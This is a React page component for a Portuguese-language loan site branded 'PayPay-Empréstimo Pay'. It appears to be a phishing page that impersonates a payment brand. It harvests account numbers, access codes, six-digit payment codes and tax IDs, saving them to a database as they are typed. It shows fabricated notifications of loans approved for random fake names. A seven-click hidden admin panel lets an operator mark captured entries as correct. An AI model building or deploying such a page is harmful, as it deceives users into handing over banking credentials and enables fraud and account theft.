import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, CheckCircle2, Globe, HelpCircle, Eye, EyeOff, ShieldCheck, Info, Search, Loader2, XCircle, LayoutDashboard, History, Trash2, RotateCcw, Download } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import logoPaypay from "@/assets/logo-paypay.png";
import userIconAsset from "@/assets/chat-logo.png";
import successIconAsset from "@/assets/success-icon.jpg.asset.json";
import { verifyAdminPassword, updateApplicationStatus, getApplications, checkApplicationStatus } from "@/lib/admin.functions";
import { Logo } from "@/components/shared";
import { StatusCheckArea } from "@/components/StatusCheckArea";
import { AdminDataList } from "@/components/AdminDataList";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [{ title: "PayPay-Empréstimo Pay" }, { name: "description", content: "Empréstimo rápido e seguro." }],
  }),
});

type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin" | "check_status";

function Index() {
  const [step, setStep] = useState<Step>("home");
  const [adminTab, setAdminTab] = useState<"users" | "trash">("users");
  const [accountNumber, setAccountNumber] = useState("");
  const [accessCode, setAccessCode] = useState("");
  const [showAccessCode, setShowAccessCode] = useState(false);
  const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
  const [amount, setAmount] = useState(35000);
  const [term, setTerm] = useState(60);
  const [personalData, setPersonalData] = useState({ name: "", nif: "" });
  const [notification, setNotification] = useState<{ name: string; amount: number } | null>(null);
  const [logoClicks, setLogoClicks] = useState(0);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [adminAuthenticated, setAdminAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [applications, setApplications] = useState<any[]>([]);

  const allFirstNames = ["João", "Maria", "António", "Ana", "Carlos"];
  const allSurnames = ["Silva", "Santos", "Ferreira", "Pereira", "Oliveira"];

  useEffect(() => {
    const showRandomNotification = () => {
        const randomName = `${allFirstNames[Math.floor(Math.random() * allFirstNames.length)] ?? "Utilizador"} ${allSurnames[Math.floor(Math.random() * allSurnames.length)] ?? "X"}`;
        const randomAmount = Math.round((Math.floor(Math.random() * (35000 - 2000 + 1)) + 2000) / 100) * 100;
        setNotification({ name: `${randomName.split(" ").slice(0, 2).join(" ")} X**`, amount: randomAmount });
        setTimeout(() => setNotification(null), 5000);
    };

    const interval = setInterval(showRandomNotification, 20000);
    const t = setTimeout(showRandomNotification, 3000);
    return () => { clearInterval(interval); clearTimeout(t); };
  }, []);

  const saveProgress = async () => {
    if (step === "home" || step === "admin" || step === "success") return;
    try {
        const { supabase } = await import("@/integrations/supabase/client");
        const payload = {
            account_number: accountNumber,
            payment_code: paymentCode.join(""),
            amount, term,
            name: personalData.name,
            nif: personalData.nif,
            status: "Candidatura recebida"
        };
        if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
        else {
            const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
            if (data) setApplicationId(data.id);
        }
    } catch (e) {}
  };

  useEffect(() => {
    if (step !== "home" && step !== "admin") {
        const timer = setTimeout(saveProgress, 300);
        return () => clearTimeout(timer);
    }
  }, [step, accountNumber, paymentCode, amount, term, personalData]);

  const onUpdateStatus = async (id: string, isCorrect: boolean) => {
    try {
        await updateApplicationStatus({ data: { id, isCorrect, adminPassword } });
        toast.success("Atualizado");
        await fetchApplications();
    } catch (e) { toast.error("Erro"); }
  };

  const fetchApplications = async () => {
    try {
        const data = await getApplications({ data: { adminPassword } });
        setApplications(data as any[]);
    } catch (e) {}
  };

  useEffect(() => {
    if (logoClicks >= 7) {
        setStep("admin");
        setLogoClicks(0);
    }
    const t = setTimeout(() => setLogoClicks(0), 1000);
    return () => clearTimeout(t);
  }, [logoClicks]);

  return (
    <div className="min-h-screen bg-[#F8F9FC] p-4">
        <header className="flex justify-between items-center mb-8">
            <Logo onClick={() => setLogoClicks(p => p + 1)} className="h-8" />
            <button className="text-xs font-bold text-muted-foreground flex items-center gap-1"><Globe className="w-4 h-4" /> Port</button>
        </header>

        <main className="max-w-md mx-auto">
            <AnimatePresence mode="wait">
                {step === "home" && (
                    <motion.div key="home" className="text-center space-y-6">
                        <h1 className="text-2xl font-bold">Empréstimos Rápidos</h1>
                        <button onClick={() => setStep("login")} className="w-full bg-primary text-white p-4 rounded-xl">Solicitar</button>
                        <button onClick={() => setStep("check_status")} className="w-full p-4 border rounded-xl">Ver Estado</button>
                    </motion.div>
                )}
                {step === "login" && (
                    <motion.div key="login" className="space-y-4">
                        <h2 className="text-xl font-bold">Entrar</h2>
                        <input className="w-full p-4 border rounded-xl" placeholder="Conta" value={accountNumber} onChange={e => setAccountNumber(e.target.value)} />
                        <button onClick={() => setStep("step2")} className="w-full bg-primary text-white p-4 rounded-xl">Continuar</button>
                    </motion.div>
                )}
                {step === "admin" && (
                    <motion.div key="admin">
                        {!adminAuthenticated ? (
                            <div className="space-y-4">
                                <input type="password" placeholder="Senha Admin" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 border" onKeyDown={e => e.key === 'Enter' && setAdminAuthenticated(true)} />
                                <button onClick={() => setAdminAuthenticated(true)} className="w-full bg-primary text-white p-4">Entrar</button>
                            </div>
                        ) : (
                            <AdminDataList adminTab={adminTab} applications={applications} setApplications={setApplications} adminPassword={adminPassword} adminAuthenticated={adminAuthenticated} onUpdateStatus={onUpdateStatus} onFetchApplications={fetchApplications} />
                        )}
                    </motion.div>
                )}
                {step === "check_status" && <StatusCheckArea onBack={() => setStep("home")} />}
            </AnimatePresence>
        </main>
    </div>
  );
}
